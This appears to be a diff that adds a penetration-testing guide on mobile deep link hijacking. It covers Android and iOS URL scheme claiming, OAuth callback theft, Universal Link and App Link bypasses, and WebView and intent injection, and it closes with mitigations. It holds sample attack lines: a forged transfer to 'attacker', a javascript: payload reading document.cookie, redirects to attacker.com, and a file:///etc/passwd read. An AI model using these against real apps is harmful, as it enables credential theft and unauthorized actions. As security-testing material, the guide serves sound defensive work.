@@ -1,0 +1,256 @@
+<vulnerability_guide>
+  <title>DEEP LINK HIJACKING</title>
+
+  <critical>Deep links allow apps to be opened via URLs, but improper validation enables attackers to hijack navigation, steal credentials, and execute unauthorized actions. On Android, any app can claim URL schemes; on iOS, Universal Links provide more security but still have bypass vectors.</critical>
+
+  <scope>
+    - URL scheme hijacking
+    - Universal Links bypass (iOS)
+    - App Links bypass (Android)
+    - Parameter injection via deep links
+    - Intent/URL scheme abuse
+    - OAuth callback hijacking
+  </scope>
+
+  <methodology>
+    1. DEEP LINK ENUMERATION
+       {% raw %}
+       # Android - Extract from manifest
+       apktool d target.apk -o decompiled
+       grep -r "scheme" decompiled/AndroidManifest.xml
+       grep -r "host" decompiled/AndroidManifest.xml
+
+       # Look for intent filters
+       <intent-filter>
+           <action android:name="android.intent.action.VIEW"/>
+           <data android:scheme="myapp" android:host="action"/>
+       </intent-filter>
+
+       # iOS - Extract from Info.plist
+       /usr/libexec/PlistBuddy -c "Print :CFBundleURLTypes" Info.plist
+
+       # Universal Links - apple-app-site-association
+       curl https://target.com/.well-known/apple-app-site-association
+       curl https://target.com/apple-app-site-association
+       {% endraw %}
+
+    2. ANDROID URL SCHEME HIJACKING
+       {% raw %}
+       # Any app can register any URL scheme
+
+       # Create malicious app claiming same scheme
+       <intent-filter>
+           <action android:name="android.intent.action.VIEW"/>
+           <category android:name="android.intent.category.DEFAULT"/>
+           <category android:name="android.intent.category.BROWSABLE"/>
+           <data android:scheme="targetapp" android:host="*"/>
+       </intent-filter>
+
+       # User clicks targetapp://callback?token=secret
+       # Android shows app picker
+       # Or if our app has higher priority, intercepts directly
+
+       # OAuth callback hijacking
+       # Redirect URI: targetapp://oauth/callback
+       # Attacker app claims same scheme
+       # Steals OAuth code/token
+       {% endraw %}
+
+    3. IOS URL SCHEME HIJACKING
+       {% raw %}
+       # iOS custom URL schemes are first-come-first-served
+
+       # Create app claiming target's scheme
+       <key>CFBundleURLTypes</key>
+       <array>
+           <dict>
+               <key>CFBundleURLSchemes</key>
+               <array>
+                   <string>targetapp</string>
+               </array>
+           </dict>
+       </array>
+
+       # If installed before target app
+       # All URLs go to malicious app
+
+       # Limitations:
+       # - Must install before legitimate app
+       # - Universal Links (https://) are more secure
+       {% endraw %}
+
+    4. PARAMETER INJECTION
+       {% raw %}
+       # Test deep link parameters
+
+       # Android test
+       adb shell am start -a android.intent.action.VIEW \
+           -d "targetapp://transfer?to=attacker&amount=1000"
+
+       # iOS test (via Safari)
+       # Open: targetapp://action?redirect=https://attacker.com
+
+       # Common vulnerable parameters:
+       # - redirect / callback URLs
+       # - user IDs
+       # - action parameters
+       # - amount / quantity values
+
+       # JavaScript injection
+       targetapp://webview?url=javascript:alert(document.cookie)
+       {% endraw %}
+
+    5. APP LINKS BYPASS (ANDROID)
+       {% raw %}
+       # App Links are verified via assetlinks.json
+       # https://target.com/.well-known/assetlinks.json
+
+       # But bypass possible:
+       # 1. Different subdomain not covered
+       # 2. HTTP version (if not forced to HTTPS)
+       # 3. Path not included in verification
+
+       # Check assetlinks.json
+       curl https://target.com/.well-known/assetlinks.json
+
+       # If paths are restricted:
+       # Try: https://target.com/unverified/path
+
+       # autoVerify="true" only works if assetlinks.json valid
+       # If verification fails, falls back to chooser
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <oauth_redirect_hijacking>
+      {% raw %}
+      # OAuth flows use redirect URIs
+
+      # Mobile OAuth typically:
+      # 1. App opens browser to authorization URL
+      # 2. User authenticates
+      # 3. Redirect to app: myapp://oauth/callback?code=xxx
+
+      # Attack:
+      # 1. Register app with same scheme
+      # 2. User initiates OAuth in legitimate app
+      # 3. Malicious app intercepts callback
+      # 4. Attacker gets OAuth code
+
+      # Mitigation: App Links / Universal Links with verified domains
+      # But many apps still use custom schemes
+      {% endraw %}
+    </oauth_redirect_hijacking>
+
+    <universal_links_bypass>
+      {% raw %}
+      # iOS Universal Links provide security
+      # But can be bypassed
+
+      # Bypass methods:
+      # 1. JavaScript navigation (may not trigger Universal Link)
+      window.location = "https://target.com/deeplink";
+      # vs click on actual link
+
+      # 2. Redirect chains
+      # Short URL -> target URL
+      # Universal Link may not trigger on redirect
+
+      # 3. Private browsing mode
+      # Some iOS versions handle differently
+
+      # 4. Long press shows menu
+      # User can choose browser instead of app
+      {% endraw %}
+    </universal_links_bypass>
+
+    <webview_bridge_exploitation>
+      {% raw %}
+      # Deep links that load WebViews
+
+      # If deep link opens WebView with URL:
+      targetapp://webview?url=https://attacker.com
+
+      # And WebView has JavaScript bridge:
+      # Execute JavaScript via attacker page
+      # Call native methods through bridge
+
+      # XSS in WebView
+      targetapp://content?html=<script>...</script>
+
+      # File access
+      targetapp://view?file=file:///etc/passwd
+      {% endraw %}
+    </webview_bridge_exploitation>
+
+    <intent_injection>
+      {% raw %}
+      # Android intent extras injection
+
+      # Deep link parsed into Intent
+      # Attacker controls extras
+
+      # Vulnerable code:
+      Intent intent = getIntent();
+      String action = intent.getStringExtra("action");
+      if (action.equals("admin")) {
+          // Privileged action
+      }
+
+      # Attack:
+      targetapp://action?action=admin
+
+      # Nested intent injection
+      # Some apps parse intent from URI
+      # Can inject full Intent object
+      {% endraw %}
+    </intent_injection>
+
+    <activity_task_hijacking>
+      {% raw %}
+      # Task affinity manipulation
+
+      # Android task management
+      # Deep link can control task behavior
+
+      # android:launchMode="singleTask"
+      # android:taskAffinity=""
+
+      # Attack:
+      # 1. User opens legitimate app
+      # 2. Attacker's deep link brings attacker Activity to front
+      # 3. Attacker Activity is in same task
+      # 4. User sees attacker's UI thinking it's legitimate
+
+      # StrandHogg vulnerability concept
+      {% endraw %}
+    </activity_task_hijacking>
+  </advanced_techniques>
+
+  <detection>
+    - Use App Links / Universal Links for https:// URLs
+    - Validate all deep link parameters server-side
+    - Implement PKCE for OAuth flows
+    - Check calling application (referer) where possible
+    - Don't trust deep link data for sensitive operations
+  </detection>
+
+  <validation>
+    - Enumerate all supported deep link schemes
+    - Successfully hijack OAuth callbacks
+    - Inject malicious parameters
+    - Access unauthorized functionality
+    - Document unvalidated deep link handlers
+  </validation>
+
+  <pro_tips>
+    - OAuth with custom schemes is always hijackable on Android
+    - Universal Links require HTTPS and domain verification
+    - Long deep link chains may break URL validation
+    - WebView loading from deep link is often exploitable
+    - Test with both Chrome and device browser on Android
+    - adb shell am start is your friend for Android testing
+  </pro_tips>
+
+  <remember>Deep links bridge the web and native apps - and inherit the worst security properties of both. Custom URL schemes have no ownership verification. Passing untrusted data through deep links to sensitive operations is as dangerous as accepting unvalidated query parameters in web apps. Treat every deep link parameter as potentially malicious.</remember>
+</vulnerability_guide>
